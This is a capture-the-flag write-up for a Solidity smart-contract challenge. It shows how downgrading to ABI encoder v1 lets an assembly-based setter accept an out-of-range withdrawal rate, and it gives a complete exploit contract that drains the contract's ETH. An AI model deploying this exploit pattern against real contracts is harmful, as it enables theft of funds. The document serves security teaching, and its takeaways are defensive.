# Restricted Proxy: ABI Encoder Version Manipulation

In this CTF challenge, we explore a vulnerability in a proxy upgrade system where changing the ABI encoder version allows bypassing type checking constraints. The challenge demonstrates how Solidity's ABI encoder versioning can lead to unexpected type validation behavior.

## Challenge Overview

The challenge presents us with a smart contract containing 100 ETH where players get one opportunity to proxy upgrade it under strict rules:

- No modification of inheritance structure
- No altering existing functions or their visibility
- No changing storage layout
- Must keep the same Solidity version (0.8.26)

The system implements several standard security measures:
- Owner-based access control for withdrawals
- Rate-limited withdrawals (default 1%)
- Single withdrawal restriction
- Fixed denominator for withdrawal calculations (10000)

The challenge setup provides players with:
- Source code for the CTF contract
- Ability to perform one proxy upgrade
- Rules for valid contract modifications

The goal is to drain all ETH from the contract. This should be difficult under normal circumstances, as:
1. Withdrawal amounts are rate-limited to a maximum of 2.55% due to uint8 type checking
2. Only one withdrawal is allowed per owner
3. Contract modifications are heavily restricted

This difficulty suggests there must be a subtle implementation flaw in the system's logic.

## Initial Code Analysis

Let's examine the core mechanics and data structures in detail.

### Core Data Structures

```solidity
bool public ownerWithdrawn;
uint256 public withdrawRate;
address public owner;
uint256 public constant WITHDRAW_DENOMINATOR = 10000;
```

Key components:
1. ownerWithdrawn - Tracks if current owner has made their withdrawal
2. withdrawRate - Configurable rate for withdrawal calculations
3. owner - Address allowed to make withdrawals
4. WITHDRAW_DENOMINATOR - Fixed denominator for rate calculations (10000)

### Key Mechanisms

#### Withdrawal System
```solidity
function withdrawFunds() external {
    assembly {
        let ownerWithdrawnSlot := sload(ownerWithdrawn.slot)
        let ownerSlot := sload(owner.slot)
        let withdrawRateSlot := sload(withdrawRate.slot)

        if iszero(ownerWithdrawnSlot) {
            revert(0, 0)
        }

        if iszero(eq(ownerSlot, caller())) {
            revert(0, 0)
        }

        sstore(ownerWithdrawn.slot, 0)

        let contractBalance := selfbalance()
        let amount := div(
            mul(contractBalance, withdrawRateSlot),
            WITHDRAW_DENOMINATOR
        )

        let success := call(gas(), caller(), amount, 0, 0, 0, 0)
        if iszero(success) {
            revert(0, 0)
        }
    }
}
```

Key observations:
1. Uses assembly for low-level storage access and calculations
2. Validates owner hasn't withdrawn and is the caller
3. Calculates withdrawal amount based on contract balance and rate
4. Prevents further withdrawals by setting ownerWithdrawn to false

#### Rate Configuration
```solidity
function changeWithdrawRate(uint8) external {
    assembly {
        sstore(withdrawRate.slot, calldataload(4))
    }
}
```

Important aspects:
1. Takes uint8 parameter but uses raw calldata loading
2. Directly stores value without explicit bounds checking
3. Relies on ABI encoder for type validation

## Finding the Vulnerability

Several potential issues stand out in the implementation:

1. Use of assembly bypasses Solidity's type safety
2. Direct calldata loading could allow larger values
3. Type checking depends on ABI encoder version

The most interesting aspect is the reliance on the ABI encoder for uint8 type validation, while the assembly code uses raw calldata loading that could accept any uint256 value.

## The Exploit

Let's break down the attack step by step.

### Exploit Setup

The exploit requires:
1. Adding `pragma abicoder v1;` to the contract
2. Upgrading to the modified contract
3. Calling changeWithdrawRate with value 10000
4. Taking ownership and withdrawing funds

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma abicoder v1;

contract CTF {
    // Original contract code...
}
```

### Attack Flow

1. Deploy modified contract with ABI encoder v1:
```solidity
CTF ctf = CTF(CHALLENGE.ctf());
```

2. Set withdrawal rate to 100%:
```solidity
(bool success, bytes memory returnData) = address(ctf).call(
    abi.encodeWithSignature("changeWithdrawRate(uint8)", 10000)
);
```

3. Take ownership and withdraw:
```solidity
ctf.becomeOwner(uint160(address(this)));
ctf.withdrawFunds();
```

### Why It Works

The exploit succeeds because:
1. ABI encoder v1 has less strict type checking than v2
2. Assembly code uses raw calldata loading without validation
3. uint8 type constraint only exists at the ABI level
4. Storage slot can hold full uint256 value

## Complete Solution

```solidity
contract Exploit {
    Challenge private immutable CHALLENGE;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    receive() external payable {}

    function exploit(address payable player) external {
        uint256 rate = 10000;

        CTF ctf = CTF(CHALLENGE.ctf());
        (bool success, bytes memory returnData) = address(ctf).call(
            abi.encodeWithSignature("changeWithdrawRate(uint8)", rate)
        );
        require(success, string(returnData));
        ctf.becomeOwner(uint160(address(this)));
        ctf.withdrawFunds();
        player.transfer(address(this).balance);
    }
}
```

## Key Takeaways

1. ABI encoder versions can significantly impact type safety
2. Assembly code bypasses Solidity's type system
3. Type constraints should be enforced at runtime when using assembly

This challenge demonstrates how seemingly minor configuration changes like ABI encoder versioning can have significant security implications when combined with low-level assembly operations that bypass type safety mechanisms.